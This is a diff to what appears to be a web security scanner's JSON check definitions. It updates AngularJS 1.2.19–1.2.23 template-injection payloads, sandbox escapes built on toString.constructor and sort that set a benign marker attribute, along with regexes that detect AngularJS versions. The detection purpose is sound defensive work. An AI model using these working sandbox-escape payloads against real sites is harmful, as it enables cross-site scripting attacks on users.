@@ -2806,7 +2806,7 @@
                   "query",
                   "form"
                 ],
-                "value": "{{toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,114,45,49,50,49,57,45,49,50,50,51))\",\"a\"].sort(toString.constructor)}}",
+                "value": "{{toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"a=document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,114,45,49,50,49,57,45,49,50,50,51))\",\"a\"].sort(toString.constructor)}}",
                 "position": "replace",
                 "operation": "replace"
               }
@@ -2863,7 +2863,7 @@
             },
             "constants": {
               "markerToken": "ptk-ng-r-1219-1223",
-              "payload": "{{toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,114,45,49,50,49,57,45,49,50,50,51))\",\"a\"].sort(toString.constructor)}}",
+              "payload": "{{toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"a=document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,114,45,49,50,49,57,45,49,50,50,51))\",\"a\"].sort(toString.constructor)}}",
               "angularDetectRegex": "(?:\\bng-app\\b|\\bdata-ng-app\\b|\\bng-controller\\b|\\bdata-ng-controller\\b|\\bng-bind\\b|\\bdata-ng-bind\\b|\\bangular\\.module\\s*\\(|angularjs/|angular(?:\\.min)?\\.js)",
               "versionRegex": "angularjs/1\\.2\\.(?:19|2[0-3])\\b|angular(?:\\.min)?\\.js[^\\n\\r<>]{0,160}1\\.2\\.(?:19|2[0-3])\\b|1\\.2\\.(?:19|2[0-3])\\b[^\\n\\r<>]{0,160}angular(?:\\.min)?\\.js|angular[-_.]1\\.2\\.(?:19|2[0-3])\\b|angular[/_-][^\\n\\r<>]{0,160}1\\.2\\.(?:19|2[0-3])\\b",
               "versionRange": "reflected-1-2-19-to-1-2-23",
@@ -2943,7 +2943,7 @@
                   "query",
                   "form"
                 ],
-                "value": "toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,101,45,49,50,49,57,45,49,50,50,51))\",\"a\"].sort(toString.constructor)",
+                "value": "toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"a=document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,101,45,49,50,49,57,45,49,50,50,51))\",\"a\"].sort(toString.constructor)",
                 "position": "replace",
                 "operation": "replace"
               }
@@ -3000,7 +3000,7 @@
             },
             "constants": {
               "markerToken": "ptk-ng-e-1219-1223",
-              "payload": "toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,101,45,49,50,49,57,45,49,50,50,51))\",\"a\"].sort(toString.constructor)",
+              "payload": "toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"a=document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,101,45,49,50,49,57,45,49,50,50,51))\",\"a\"].sort(toString.constructor)",
               "angularDetectRegex": "(?:\\bng-app\\b|\\bdata-ng-app\\b|\\bng-controller\\b|\\bdata-ng-controller\\b|\\bng-bind\\b|\\bdata-ng-bind\\b|\\bangular\\.module\\s*\\(|angularjs/|angular(?:\\.min)?\\.js)",
               "versionRegex": "angularjs/1\\.2\\.(?:19|2[0-3])\\b|angular(?:\\.min)?\\.js[^\\n\\r<>]{0,160}1\\.2\\.(?:19|2[0-3])\\b|1\\.2\\.(?:19|2[0-3])\\b[^\\n\\r<>]{0,160}angular(?:\\.min)?\\.js|angular[-_.]1\\.2\\.(?:19|2[0-3])\\b|angular[/_-][^\\n\\r<>]{0,160}1\\.2\\.(?:19|2[0-3])\\b",
               "versionRange": "reflected-1-2-19-to-1-2-23",
@@ -3080,7 +3080,7 @@
                   "query",
                   "form"
                 ],
-                "value": "toString.constructor.prototype.toString=toString.constructor.prototype.call;['document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,101,45,115,113,45,49,50,49,57,45,49,50,50,51))','a'].sort(toString.constructor);",
+                "value": "toString.constructor.prototype.toString=toString.constructor.prototype.call;['a=document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,101,45,115,113,45,49,50,49,57,45,49,50,50,51))','a'].sort(toString.constructor);",
                 "position": "replace",
                 "operation": "replace"
               }
@@ -3138,7 +3138,7 @@
             },
             "constants": {
               "markerToken": "ptk-ng-e-sq-1219-1223",
-              "payload": "toString.constructor.prototype.toString=toString.constructor.prototype.call;['document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,101,45,115,113,45,49,50,49,57,45,49,50,50,51))','a'].sort(toString.constructor);",
+              "payload": "toString.constructor.prototype.toString=toString.constructor.prototype.call;['a=document.documentElement.setAttribute(String.fromCharCode(100,97,116,97,45,112,116,107,45,120,115,115),String.fromCharCode(112,116,107,45,110,103,45,101,45,115,113,45,49,50,49,57,45,49,50,50,51))','a'].sort(toString.constructor);",
               "angularDetectRegex": "(?:\\bng-app\\b|\\bdata-ng-app\\b|\\bng-controller\\b|\\bdata-ng-controller\\b|\\bng-bind\\b|\\bdata-ng-bind\\b|\\bangular\\.module\\s*\\(|angularjs/|angular(?:\\.min)?\\.js)",
               "versionRegex": "angularjs/1\\.2\\.(?:19|2[0-3])\\b|angular(?:\\.min)?\\.js[^\\n\\r<>]{0,160}1\\.2\\.(?:19|2[0-3])\\b|1\\.2\\.(?:19|2[0-3])\\b[^\\n\\r<>]{0,160}angular(?:\\.min)?\\.js|angular[-_.]1\\.2\\.(?:19|2[0-3])\\b|angular[/_-][^\\n\\r<>]{0,160}1\\.2\\.(?:19|2[0-3])\\b",
               "versionRange": "reflected-1-2-19-to-1-2-23",
